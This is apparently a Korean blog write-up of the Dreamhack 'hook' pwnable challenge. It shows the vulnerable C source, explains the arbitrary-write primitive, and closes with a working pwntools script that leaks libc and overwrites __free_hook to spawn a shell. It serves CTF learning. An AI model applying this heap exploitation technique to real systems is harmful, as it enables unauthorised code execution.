---
published: true
image: /img
layout: post
title: "[Dreamhack] PWN hook"
excerpt: "드림핵 포너블 hook 문제풀이"
tags: [Dreamhack, pwnable, ctf, writeup]
math: true
date: 2023-02-07 14:30
---

dreamhack 크리스마스 CTF 문제중에 hook문제가 있어 같이 풀어봤다. 문제 자체는 드림핵 hook 문제가 난이도도 낮고 코드도 간단하다. 

문제파일을 다운받고 압축을 풀면 hook바이너리와 소스코드, libc가 있다. 문제 환경은 ubuntu 16.04로 도커를 사용해 문제를 디버깅 했다. 소스코드는 다음과 같다.

```c
// gcc -o init_fini_array init_fini_array.c -Wl,-z,norelro
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    long *ptr;
    size_t size;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("Size: ");
    scanf("%ld", &size);

    ptr = malloc(size);

    printf("Data: ");
    read(0, ptr, size);

    *(long *)*ptr = *(ptr+1);
   
    free(ptr);
    free(ptr);

    system("/bin/sh");
    return 0;
}
```

stdout의 주소를 출력해 주고 malloc하기 위한 사이즈를 입력 받는다. 이후 malloc한 포인터를 ptr에 대입하고 malloc의 사이즈 만큼 read 함수를 통해 ptr에 쓴다.

그 다음, *ptr의 주소에 *(ptr+1)을 대입한다. 그다음 ptr을 두번 free하고 system("/bin/sh")를 실행한다. 일단 더블프리 오류로 인해 system함수는 정상적으로 실행이 힘들 것 이다.

여기서 활용할 것은 다음 코드이다.
```c
*(long *)*ptr = *(ptr+1);
```

만약 ptr 변수에 read 함수를 통해 0x40000000000000001000000000000000라는 값을 입력 받았다고 가정하자. 위 코드는 ptr의 포인터가 가리키는 함수의 내용을 *(ptr+1)로 바꾸는 코드이다. 따라서 0x40000000000000001000000000000000라는 값을 입력했을 때의 결과는 0x4000000000000000 주소의 값에 0x1000000000000000라는 값을 넣게 된다. 64비트 기반이기 때문에 16사이즈로 잘라서 계산하면 편하다.

그럼 이 기능을 이용해 read 함수를 통해서 p64(free_hook)+p64(*(system("/bin/sh")))를 입력하면 free가 실행되기 전 system("/bin/sh")를 실행하게 된다. 원샷 가젯을 이용해도 될것 같지만 문제에서 system함수가 존재하기 때문에 이를 이용해 exploit코드를 작성했다.

아래 코드를 이용하면 문제를 쉘을 획득할 수 있다.

```python
from pwn import *
context.update(arch='amd64', os='linux')
#c = remote("host3.dreamhack.games", 22736)
c = process("./hook", env={'LD_PRELOAD':'./libc.so.6'})
#c = process("./hook")
libc=ELF('./libc.so.6')

print(c.recvuntil(b"stdout: "))
stdout = int(c.recv(14), 16)
main_syscall = 0x400a11

print("stdout : "+hex(stdout))

libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
free_hook = libc_base + libc.symbols['__free_hook']

payload = p64(free_hook)+p64(main_syscall)

c.sendlineafter(b"Size: ", b"400")
c.sendlineafter(b"Data: ", payload)

c.interactive()
```